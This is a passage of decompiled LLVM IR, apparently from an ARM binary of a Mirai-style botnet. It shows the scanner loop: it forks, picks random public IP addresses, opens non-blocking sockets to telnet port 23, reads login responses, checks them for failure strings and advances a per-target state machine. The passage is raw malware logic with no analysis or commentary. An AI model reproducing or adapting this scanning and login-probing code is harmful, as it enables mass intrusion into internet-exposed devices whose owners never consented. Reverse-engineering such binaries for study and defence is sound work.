  %v3_15ad4 = load i32, i32* @r4, align 4
  store i32 %v3_15ad4, i32* %stack_var_-24, align 4
  %v6_15ad4 = load i32, i32* @r5, align 4
  %v9_15ad4 = load i32, i32* @fp, align 4
  store i32 88796, i32* %stack_var_-4, align 4
  %v19_15ad4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_15ad8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_15ad8, i32* @fp, align 4
  %v2_15adc = ptrtoint i32* %stack_var_-648 to i32
  store i32 %v2_15adc, i32* %r3.global-to-local, align 4
  %v0_15af4 = call i32 @fork()
  store i32 %v0_15af4, i32* %r3.global-to-local, align 4
  %v2_15afc = icmp eq i32 %v0_15af4, 0
  br i1 %v2_15afc, label %dec_label_pc_16c3c, label %dec_label_pc_15b04

dec_label_pc_15b04:                               ; preds = %entry
  %v2_15b08 = call i32 @__GI_time(i32* null)
  store i32 %v2_15b08, i32* @r0, align 4
  %v0_15b10 = call i32 @__GI_getpid()
  store i32 %v0_15b10, i32* @r0, align 4
  store i32 %v0_15b10, i32* %r3.global-to-local, align 4
  %v2_15b18 = xor i32 %v2_15b08, %v0_15b10
  store i32 %v2_15b18, i32* @r4, align 4
  %v0_15b1c = call i32 @getppid()
  %v0_15b24 = load i32, i32* @r4, align 4
  %v2_15b24 = add i32 %v0_15b24, %v0_15b1c
  store i32 %v2_15b24, i32* %r3.global-to-local, align 4
  %v1_15b2c = call i32 @srand(i32 %v2_15b24)
  %v2_15b34 = call i32 @__GI_time(i32* null)
  store i32 %v2_15b34, i32* @r0, align 4
  store i32 %v2_15b34, i32* @r4, align 4
  %v0_15b3c = call i32 @__GI_getpid()
  %v0_15b44 = load i32, i32* @r4, align 4
  %v2_15b44 = xor i32 %v0_15b44, %v0_15b3c
  store i32 %v2_15b44, i32* %r3.global-to-local, align 4
  %v1_15b4c = call i32 @init_rand(i32 %v2_15b44)
  %v0_15b50 = call i32 @getdtablesize()
  %v1_15b58 = add i32 %v0_15b50, -100
  store i32 %v1_15b58, i32* %r2.global-to-local, align 4
  %v7_15b6c = icmp sgt i32 %v1_15b58, %arg2
  br i1 %v7_15b6c, label %dec_label_pc_15b70, label %dec_label_pc_15b78

dec_label_pc_15b70:                               ; preds = %dec_label_pc_15b04
  br label %dec_label_pc_15b78

dec_label_pc_15b78:                               ; preds = %dec_label_pc_15b04, %dec_label_pc_15b70
  %stack_var_-64.0 = phi i32 [ %arg2, %dec_label_pc_15b70 ], [ %v1_15b58, %dec_label_pc_15b04 ]
  store i32 -592, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_15b88 = add i32 %v19_15ad4, -592
  %v5_15b88 = inttoptr i32 %v4_15b88 to i16*
  store i16 2, i16* %v5_15b88, align 4
  %v1_15b90 = call i32 @__GI_htons(i32 23)
  %v2_15bb0 = ptrtoint i32* %stack_var_-608 to i32
  store i32 %v2_15bb0, i32* %r3.global-to-local, align 4
  store i32 %v2_15bb0, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_15bc0 = call i32 @__GI_memset()
  %v1_15bcc = call i32 @malloc(i32 1025)
  store i32 %v1_15bcc, i32* %r3.global-to-local, align 4
  store i32 %v1_15bcc, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1025, i32* @r2, align 4
  %v0_15be8 = call i32 @__GI_memset()
  %v3_15bf0 = mul i32 %stack_var_-64.0, 32
  %v1_15bf4 = or i32 %v3_15bf0, 7
  %v1_15bf8 = add i32 %v1_15bf4, 7
  %v3_15bfc = and i32 %v1_15bf8, -24
  %v1_15c04 = load i32, i32* @sp, align 4
  %v2_15c04 = sub i32 %v1_15c04, %v3_15bfc
  %v1_15c14 = add i32 %v2_15c04, 15
  %v3_15c18 = and i32 %v1_15c14, -8
  %v2_15c3c = mul i32 %stack_var_-64.0, 5
  store i32 %v2_15c3c, i32* %r3.global-to-local, align 4
  store i32 %v3_15c18, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v2_15c3c, i32* @r2, align 4
  %v0_15c4c = call i32 @__GI_memset()
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-64.0, i32* %r3.global-to-local, align 4
  %v5_15cd457 = icmp sgt i32 %stack_var_-64.0, 0
  br i1 %v5_15cd457, label %dec_label_pc_15c5c, label %dec_label_pc_15cd8.preheader

dec_label_pc_15c5c:                               ; preds = %dec_label_pc_15b78, %dec_label_pc_15c5c
  %storemerge458 = phi i32 [ %v1_15cc0, %dec_label_pc_15c5c ], [ 0, %dec_label_pc_15b78 ]
  %v3_15c64 = mul i32 %storemerge458, 32
  %v2_15c68 = add i32 %v3_15c64, %v3_15c18
  store i32 %v2_15c68, i32* %r3.global-to-local, align 4
  store i32 %v2_15c68, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 32, i32* @r2, align 4
  %v0_15c78 = call i32 @__GI_memset()
  %v3_15c98 = add i32 %v2_15c68, 9
  %v4_15c98 = inttoptr i32 %v3_15c98 to i8*
  store i8 1, i8* %v4_15c98, align 1
  %v2_15cb0 = add i32 %v2_15c68, 28
  %v2_15cb8 = inttoptr i32 %v2_15cb0 to i32*
  store i32 %v1_15bcc, i32* %v2_15cb8, align 4
  %v1_15cc0 = add nuw nsw i32 %storemerge458, 1
  store i32 %v1_15cc0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-64.0, i32* %r3.global-to-local, align 4
  %v5_15cd4 = icmp slt i32 %v1_15cc0, %stack_var_-64.0
  br i1 %v5_15cd4, label %dec_label_pc_15c5c, label %dec_label_pc_15cd8.preheader

dec_label_pc_15cd8.preheader:                     ; preds = %dec_label_pc_15c5c, %dec_label_pc_15b78
  %v2_15d44 = add i32 %v3_15c18, 8
  %v2_16044 = ptrtoint i32* %stack_var_-616 to i32
  %v2_160b4 = ptrtoint i32* %stack_var_-328 to i32
  %v2_16180 = ptrtoint i32* %stack_var_-336 to i32
  %v2_161ec = ptrtoint i32* %stack_var_-344 to i32
  %v2_161f0 = ptrtoint i32* %stack_var_-340 to i32
  %v2_162cc = add i32 %v3_15c18, 16
  %v2_16328 = add i32 %v3_15c18, 28
  br label %dec_label_pc_15cd8

dec_label_pc_15cd8:                               ; preds = %dec_label_pc_15cd8, %dec_label_pc_16c1c, %dec_label_pc_15cd8.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-64.0, i32* %r3.global-to-local, align 4
  br i1 %v5_15cd457, label %dec_label_pc_15ce4, label %dec_label_pc_15cd8

dec_label_pc_15ce4:                               ; preds = %dec_label_pc_15cd8, %dec_label_pc_16c1c
  %storemerge549 = phi i32 [ %v1_16c20, %dec_label_pc_16c1c ], [ 0, %dec_label_pc_15cd8 ]
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v3_15cf0 = mul i32 %storemerge549, 32
  %v2_15cf4 = add i32 %v3_15cf0, %v3_15c18
  %v2_15cf8 = add i32 %v2_15cf4, 16
  store i32 %v2_15cf8, i32* %r3.global-to-local, align 4
  %v1_15cfc = inttoptr i32 %v2_15cf8 to i32*
  %v2_15cfc = load i32, i32* %v1_15cfc, align 8
  store i32 %v2_15cfc, i32* %r3.global-to-local, align 4
  %v2_15d00 = icmp eq i32 %v2_15cfc, 0
  br i1 %v2_15d00, label %dec_label_pc_15d08, label %dec_label_pc_15d34

dec_label_pc_15d08:                               ; preds = %dec_label_pc_15ce4
  store i32 %storemerge549, i32* @r4, align 4
  %v2_15d10 = call i32 @__GI_time(i32* null)
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v0_15d24 = load i32, i32* @r4, align 4
  %v3_15d24 = mul i32 %v0_15d24, 32
  %v2_15d2c = add i32 %v2_162cc, %v3_15d24
  store i32 %v2_15d2c, i32* %r3.global-to-local, align 4
  %v2_15d30 = inttoptr i32 %v2_15d2c to i32*
  store i32 %v2_15d10, i32* %v2_15d30, align 8
  br label %dec_label_pc_15d34

dec_label_pc_15d34:                               ; preds = %dec_label_pc_15ce4, %dec_label_pc_15d08
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_15d48 = add i32 %v2_15d44, %v3_15cf0
  store i32 %v2_15d48, i32* %r3.global-to-local, align 4
  %v1_15d4c = inttoptr i32 %v2_15d48 to i8*
  %v2_15d4c = load i8, i8* %v1_15d4c, align 8
  %v3_15d4c = sext i8 %v2_15d4c to i32
  %v4_15d4c = zext i8 %v2_15d4c to i32
  store i32 %v4_15d4c, i32* %r3.global-to-local, align 4
  switch i32 %v3_15d4c, label %dec_label_pc_16c1c [
    i32 0, label %dec_label_pc_15d7c
    i32 1, label %dec_label_pc_160c8.lr.ph
    i32 2, label %dec_label_pc_1630c
    i32 3, label %dec_label_pc_16440
    i32 4, label %dec_label_pc_1654c
    i32 5, label %dec_label_pc_16680
    i32 6, label %dec_label_pc_1678c
    i32 7, label %dec_label_pc_169e0
  ]

dec_label_pc_15d7c:                               ; preds = %dec_label_pc_15d34
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_15d90 = add i32 %v2_15cf4, 8
  store i32 %v2_15d90, i32* %r3.global-to-local, align 4
  %v1_15d94 = add i32 %v2_15cf4, 9
  %v2_15d94 = inttoptr i32 %v1_15d94 to i8*
  %v3_15d94 = load i8, i8* %v2_15d94, align 1
  %v7_15d98 = icmp eq i8 %v3_15d94, 1
  store i32 %storemerge549, i32* %r3.global-to-local, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  br i1 %v7_15d98, label %dec_label_pc_15da0, label %dec_label_pc_15e24

dec_label_pc_15da0:                               ; preds = %dec_label_pc_15d7c
  %v2_15db0 = or i32 %v3_15cf0, 28
  %v2_15db4 = add i32 %v2_15db0, %v3_15c18
  store i32 %v2_15db4, i32* %r3.global-to-local, align 4
  %v1_15db8 = inttoptr i32 %v2_15db4 to i32*
  %v2_15db8 = load i32, i32* %v1_15db8, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  store i32 %v2_15cf4, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 32, i32* @r2, align 4
  %v0_15ddc = call i32 @__GI_memset()
  %v2_15df4 = add i32 %v2_15cf4, 28
  store i32 %v2_15df4, i32* %r2.global-to-local, align 4
  store i32 %v2_15db8, i32* %r3.global-to-local, align 4
  %v2_15dfc = inttoptr i32 %v2_15df4 to i32*
  store i32 %v2_15db8, i32* %v2_15dfc, align 4
  store i32 %storemerge549, i32* @r4, align 4
  %v4_15e04 = call i32 @getRandomPublicIP(i32 %v0_15ddc, i32 28, i32 %v2_15df4, i32 %v2_15db8)
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v0_15e10 = load i32, i32* @r4, align 4
  %v3_15e10 = mul i32 %v0_15e10, 32
  %v2_15e14 = add i32 %v3_15e10, %v3_15c18
  %v2_15e18 = or i32 %v2_15e14, 4
  store i32 %v2_15e18, i32* %r3.global-to-local, align 4
  %v2_15e1c = inttoptr i32 %v2_15e18 to i32*
  store i32 %v4_15e04, i32* %v2_15e1c, align 4
  br label %dec_label_pc_15f58

dec_label_pc_15e24:                               ; preds = %dec_label_pc_15d7c
  store i32 %v2_15d90, i32* %r3.global-to-local, align 4
  %v3_15e3c = load i8, i8* %v2_15d94, align 1
  %v4_15e3c = zext i8 %v3_15e3c to i32
  store i32 %v4_15e3c, i32* %r3.global-to-local, align 4
  %v2_15e40 = icmp eq i8 %v3_15e3c, 0
  br i1 %v2_15e40, label %dec_label_pc_15e48, label %dec_label_pc_15f58

dec_label_pc_15e48:                               ; preds = %dec_label_pc_15e24
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15d90, i32* %r3.global-to-local, align 4
  %v1_15e60 = add i32 %v2_15cf4, 10
  %v2_15e60 = inttoptr i32 %v1_15e60 to i8*
  %v3_15e60 = load i8, i8* %v2_15e60, align 2
  %v4_15e60 = zext i8 %v3_15e60 to i32
  %v1_15e64 = add nuw nsw i32 %v4_15e60, 1
  %v1_15e68 = urem i32 %v1_15e64, 256
  store i32 %v1_15e68, i32* %ip.global-to-local, align 4
  %v1_15e84 = trunc i32 %v1_15e64 to i8
  store i8 %v1_15e84, i8* %v2_15e60, align 2
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15d90, i32* %r3.global-to-local, align 4
  %v1_15ea0 = add i32 %v2_15cf4, 11
  %v2_15ea0 = inttoptr i32 %v1_15ea0 to i8*
  %v3_15ea0 = load i8, i8* %v2_15ea0, align 1
  %v4_15ea0 = zext i8 %v3_15ea0 to i32
  %v1_15ea4 = add nuw nsw i32 %v4_15ea0, 1
  %v1_15ea8 = urem i32 %v1_15ea4, 256
  store i32 %v1_15ea8, i32* %ip.global-to-local, align 4
  %v1_15ec4 = trunc i32 %v1_15ea4 to i8
  store i8 %v1_15ec4, i8* %v2_15ea0, align 1
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15d90, i32* %r3.global-to-local, align 4
  %v3_15ee0 = load i8, i8* %v2_15ea0, align 1
  %v7_15ee4 = icmp eq i8 %v3_15ee0, 100
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  br i1 %v7_15ee4, label %dec_label_pc_15eec, label %dec_label_pc_15f10

dec_label_pc_15eec:                               ; preds = %dec_label_pc_15e48
  store i32 %v2_15d90, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_15d94, align 1
  br label %dec_label_pc_16c1c

dec_label_pc_15f10:                               ; preds = %dec_label_pc_15e48
  store i32 %v2_15d90, i32* %r3.global-to-local, align 4
  %v3_15f28 = load i8, i8* %v2_15e60, align 2
  %v4_15f28 = zext i8 %v3_15f28 to i32
  store i32 %v4_15f28, i32* %r3.global-to-local, align 4
  %v7_15f2c = icmp eq i8 %v3_15f28, 100
  br i1 %v7_15f2c, label %dec_label_pc_15f34, label %dec_label_pc_15f58

dec_label_pc_15f34:                               ; preds = %dec_label_pc_15f10
  store i32 %v2_15d90, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_15d94, align 1
  br label %dec_label_pc_16c1c

dec_label_pc_15f58:                               ; preds = %dec_label_pc_15f10, %dec_label_pc_15e24, %dec_label_pc_15da0
  store i32 -592, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i16 2, i16* %v5_15b88, align 4
  %v1_15f70 = call i32 @__GI_htons(i32 23)
  store i32 %v2_15bb0, i32* %r3.global-to-local, align 4
  store i32 %v2_15bb0, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_15fa0 = call i32 @__GI_memset()
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_15fb8 = or i32 %v2_15cf4, 4
  store i32 %v2_15fb8, i32* %r3.global-to-local, align 4
  %v1_15fbc = inttoptr i32 %v2_15fb8 to i32*
  %v2_15fbc = load i32, i32* %v1_15fbc, align 4
  store i32 %v2_15fbc, i32* %r3.global-to-local, align 4
  store i32 %storemerge549, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_15fd4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v2_15fe0 = load i32, i32* @r4, align 4
  %v5_15fe0 = mul i32 %v2_15fe0, 32
  %v6_15fe0 = add i32 %v5_15fe0, %v3_15c18
  %v7_15fe0 = inttoptr i32 %v6_15fe0 to i32*
  store i32 %v3_15fd4, i32* %v7_15fe0, align 8
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v4_15fec = mul i32 %storemerge549, 32
  %v5_15fec = add i32 %v4_15fec, %v3_15c18
  %v6_15fec = inttoptr i32 %v5_15fec to i32*
  %v7_15fec = load i32, i32* %v6_15fec, align 8
  store i32 %v7_15fec, i32* %r3.global-to-local, align 4
  %v7_15ff0 = icmp eq i32 %v7_15fec, -1
  br i1 %v7_15ff0, label %dec_label_pc_16c1c, label %dec_label_pc_15ff8

dec_label_pc_15ff8:                               ; preds = %dec_label_pc_15f58
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v7_16000 = load i32, i32* %v6_15fec, align 8
  store i32 %v7_16000, i32* @r4, align 4
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v7_1600c = load i32, i32* %v6_15fec, align 8
  store i32 %v7_1600c, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_1601c = call i32 @fcntl(i32 %v7_1600c, i32 3, i32 0)
  %v1_16024 = or i32 %v3_1601c, 2048
  store i32 %v1_16024, i32* @r3, align 4
  %v0_16028 = load i32, i32* @r4, align 4
  store i32 %v1_16024, i32* %r2.global-to-local, align 4
  %v3_16034 = call i32 @fcntl(i32 %v0_16028, i32 4, i32 %v1_16024)
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v7_16040 = load i32, i32* %v6_15fec, align 8
  store i32 %v7_16040, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_16054 = call i32 @connect(i32 %v7_16040, i32 %v2_16044, i32 16)
  store i32 %v3_16054, i32* %r3.global-to-local, align 4
  %v3_1605c = icmp eq i32 %v3_16054, -1
  br i1 %v3_1605c, label %dec_label_pc_16064, label %dec_label_pc_16094

dec_label_pc_16064:                               ; preds = %dec_label_pc_15ff8
  %v0_16064 = call i32 @__errno_location()
  store i32 %v0_16064, i32* %r3.global-to-local, align 4
  %v1_1606c = inttoptr i32 %v0_16064 to i32*
  %v2_1606c = load i32, i32* %v1_1606c, align 4
  store i32 %v2_1606c, i32* %r3.global-to-local, align 4
  %v7_16070 = icmp eq i32 %v2_1606c, 115
  br i1 %v7_16070, label %dec_label_pc_16094, label %dec_label_pc_16078

dec_label_pc_16078:                               ; preds = %dec_label_pc_16064
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v1_1608c = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_16094:                               ; preds = %dec_label_pc_15ff8, %dec_label_pc_16064
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v2_160ac = inttoptr i32 %v2_15cf4 to i32*
  %v3_160ac = call i32 @advance_state(i32* %v2_160ac, i32 1)
  br label %dec_label_pc_16c1c

dec_label_pc_160c8.lr.ph:                         ; preds = %dec_label_pc_15d34
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_160c8

dec_label_pc_160c8:                               ; preds = %dec_label_pc_160c8.lr.ph, %dec_label_pc_160c8
  %storemerge610 = phi i32 [ 0, %dec_label_pc_160c8.lr.ph ], [ %v1_160dc, %dec_label_pc_160c8 ]
  store i32 %v2_160b4, i32* %r2.global-to-local, align 4
  %v5_160d4 = mul nuw nsw i32 %storemerge610, 4
  %v6_160d4 = add i32 %v5_160d4, %v2_160b4
  %v7_160d4 = inttoptr i32 %v6_160d4 to i32*
  store i32 0, i32* %v7_160d4, align 4
  %v1_160dc = add nuw nsw i32 %storemerge610, 1
  store i32 %v1_160dc, i32* %r3.global-to-local, align 4
  %tmp40 = icmp ult i32 %v1_160dc, 32
  br i1 %tmp40, label %dec_label_pc_160c8, label %dec_label_pc_160f0

dec_label_pc_160f0:                               ; preds = %dec_label_pc_160c8
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v4_160f8 = mul i32 %storemerge549, 32
  %v5_160f8 = add i32 %v4_160f8, %v3_15c18
  %v6_160f8 = inttoptr i32 %v5_160f8 to i32*
  %v7_160f8 = load i32, i32* %v6_160f8, align 8
  %v3_160fc = udiv i32 %v7_160f8, 32
  %v3_16110 = mul nuw nsw i32 %v3_160fc, 4
  %v2_16118 = add i32 %v3_16110, %v19_15ad4
  store i32 %v2_16118, i32* %r2.global-to-local, align 4
  %v2_1611c = add i32 %v2_16118, -304
  store i32 %v2_1611c, i32* %r3.global-to-local, align 4
  %v1_16120 = inttoptr i32 %v2_1611c to i32*
  %v2_16120 = load i32, i32* %v1_16120, align 4
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v7_1612c = load i32, i32* %v6_160f8, align 8
  %v1_16130 = urem i32 %v7_1612c, 32
  %v6_16138 = shl i32 1, %v1_16130
  %v2_1613c = or i32 %v6_16138, %v2_16120
  store i32 %v2_1613c, i32* %v1_16120, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v7_16174 = load i32, i32* %v6_160f8, align 8
  %v1_16178 = add i32 %v7_16174, 1
  store i32 %v1_16178, i32* %r2.global-to-local, align 4
  store i32 %v2_160b4, i32* %ip.global-to-local, align 4
  %v1_16184 = load i32, i32* @sp, align 4
  %v2_16184 = inttoptr i32 %v1_16184 to i32*
  store i32 %v2_16180, i32* %v2_16184, align 4
  %v0_16188 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_160b4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_16198 = load i32, i32* %stack_var_-336, align 4
  %v5_16198 = call i32 @__libc_select(i32 %v0_16188, i32 0, i32 %v2_160b4, i32 0, i32 %v4_16198)
  store i32 %v5_16198, i32* %r3.global-to-local, align 4
  %v7_161a8 = icmp eq i32 %v5_16198, 1
  br i1 %v7_161a8, label %dec_label_pc_161b0, label %dec_label_pc_16294

dec_label_pc_161b0:                               ; preds = %dec_label_pc_160f0
  store i32 0, i32* %v1_15cfc, align 8
  store i32 4, i32* %stack_var_-340, align 4
  store i32 0, i32* %stack_var_-344, align 4
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v7_161e8 = load i32, i32* %v6_160f8, align 8
  store i32 %v7_161e8, i32* %r2.global-to-local, align 4
  store i32 %v2_161ec, i32* %ip.global-to-local, align 4
  %v1_161f4 = load i32, i32* @sp, align 4
  %v2_161f4 = inttoptr i32 %v1_161f4 to i32*
  store i32 %v2_161f0, i32* %v2_161f4, align 4
  %v0_161f8 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_161ec, i32* %r3.global-to-local, align 4
  %v4_16208 = load i32, i32* %stack_var_-344, align 4
  %v5_16208 = call i32 @getsockopt(i32 %v0_161f8, i32 1, i32 4, i32 %v2_161ec, i32 %v4_16208)
  %v3_1620c = load i32, i32* %stack_var_-344, align 4
  store i32 %v3_1620c, i32* %r3.global-to-local, align 4
  %v2_16210 = icmp eq i32 %v3_1620c, 0
  br i1 %v2_16210, label %dec_label_pc_16234, label %dec_label_pc_16218

dec_label_pc_16218:                               ; preds = %dec_label_pc_161b0
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v1_1622c = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_16234:                               ; preds = %dec_label_pc_161b0
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v7_1623c = load i32, i32* %v6_160f8, align 8
  store i32 %v7_1623c, i32* @r4, align 4
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v7_16248 = load i32, i32* %v6_160f8, align 8
  store i32 %v7_16248, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_16258 = call i32 @fcntl(i32 %v7_16248, i32 3, i32 0)
  %v1_16260 = and i32 %v3_16258, -2049
  store i32 %v1_16260, i32* @r3, align 4
  %v0_16264 = load i32, i32* @r4, align 4
  store i32 %v1_16260, i32* %r2.global-to-local, align 4
  %v3_16270 = call i32 @fcntl(i32 %v0_16264, i32 4, i32 %v1_16260)
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v2_1628c = inttoptr i32 %v2_15cf4 to i32*
  %v3_1628c = call i32 @advance_state(i32* %v2_1628c, i32 2)
  br label %dec_label_pc_16c1c

dec_label_pc_16294:                               ; preds = %dec_label_pc_160f0
  store i32 %v5_16198, i32* %r3.global-to-local, align 4
  %v3_16298 = icmp eq i32 %v5_16198, -1
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  br i1 %v3_16298, label %dec_label_pc_162a0, label %dec_label_pc_162bc

dec_label_pc_162a0:                               ; preds = %dec_label_pc_16294
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v1_162b4 = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_162bc:                               ; preds = %dec_label_pc_16294
  %v2_162d0 = add i32 %v3_15cf0, %v2_162cc
  store i32 %v2_162d0, i32* %r3.global-to-local, align 4
  %v1_162d4 = inttoptr i32 %v2_162d0 to i32*
  %v2_162d4 = load i32, i32* %v1_162d4, align 8
  store i32 %v2_162d4, i32* %r3.global-to-local, align 4
  %v1_162d8 = add i32 %v2_162d4, 7
  store i32 %v1_162d8, i32* @r4, align 4
  %v2_162e0 = call i32 @__GI_time(i32* null)
  store i32 %v2_162e0, i32* %r3.global-to-local, align 4
  %v0_162e8 = load i32, i32* @r4, align 4
  %v3_162e8 = icmp ult i32 %v0_162e8, %v2_162e0
  br i1 %v3_162e8, label %dec_label_pc_162f0, label %dec_label_pc_16c1c

dec_label_pc_162f0:                               ; preds = %dec_label_pc_162bc
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v1_16304 = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_1630c:                               ; preds = %dec_label_pc_15d34
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v4_16314 = mul i32 %storemerge549, 32
  %v5_16314 = add i32 %v4_16314, %v3_15c18
  %v6_16314 = inttoptr i32 %v5_16314 to i32*
  %v7_16314 = load i32, i32* %v6_16314, align 8
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_1632c = add i32 %v3_15cf0, %v2_16328
  store i32 %v2_1632c, i32* %r3.global-to-local, align 4
  %v1_16330 = inttoptr i32 %v2_1632c to i32*
  %v2_16330 = load i32, i32* %v1_16330, align 4
  store i32 %v2_16330, i32* %r2.global-to-local, align 4
  %v1_16338 = load i32, i32* @sp, align 4
  %v2_16338 = inttoptr i32 %v1_16338 to i32*
  store i32 ptrtoint (i32* @global_var_452a0 to i32), i32* %v2_16338, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_16344 = inttoptr i32 %v2_16330 to i8*
  %v5_16344 = call i32 @read_until_response(i32 %v7_16314, i32 %arg1, i8* %v4_16344, i32 1024)
  store i32 %v5_16344, i32* %r3.global-to-local, align 4
  %v2_1634c = icmp eq i32 %v5_16344, 0
  br i1 %v2_1634c, label %dec_label_pc_163f0, label %dec_label_pc_16354

dec_label_pc_16354:                               ; preds = %dec_label_pc_1630c
  store i32 %storemerge549, i32* @r4, align 4
  %v2_1635c = call i32 @__GI_time(i32* null)
  %v0_16370 = load i32, i32* @r4, align 4
  %v3_16370 = mul i32 %v0_16370, 32
  %v2_16378 = add i32 %v2_162cc, %v3_16370
  %v2_1637c = inttoptr i32 %v2_16378 to i32*
  store i32 %v2_1635c, i32* %v2_1637c, align 8
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_1632c, i32* %r3.global-to-local, align 4
  %v2_16398 = load i32, i32* %v1_16330, align 4
  store i32 %v2_16398, i32* %r3.global-to-local, align 4
  %v1_163a0 = call i32 @contains_fail(i32 %v2_16398)
  %v2_163a8 = icmp eq i32 %v1_163a0, 0
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  br i1 %v2_163a8, label %dec_label_pc_163d0, label %dec_label_pc_163b0

dec_label_pc_163b0:                               ; preds = %dec_label_pc_16354
  %v2_163c8 = inttoptr i32 %v2_15cf4 to i32*
  %v3_163c8 = call i32 @advance_state(i32* %v2_163c8, i32 0)
  br label %dec_label_pc_16c1c

dec_label_pc_163d0:                               ; preds = %dec_label_pc_16354
  %v2_163e8 = inttoptr i32 %v2_15cf4 to i32*
  %v3_163e8 = call i32 @advance_state(i32* %v2_163e8, i32 3)
  br label %dec_label_pc_16c1c

dec_label_pc_163f0:                               ; preds = %dec_label_pc_1630c
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_16404 = add i32 %v3_15cf0, %v2_162cc
  store i32 %v2_16404, i32* %r3.global-to-local, align 4
  %v1_16408 = inttoptr i32 %v2_16404 to i32*
  %v2_16408 = load i32, i32* %v1_16408, align 8
  store i32 %v2_16408, i32* %r3.global-to-local, align 4
  %v1_1640c = add i32 %v2_16408, 7
  store i32 %v1_1640c, i32* @r4, align 4
  %v2_16414 = call i32 @__GI_time(i32* null)
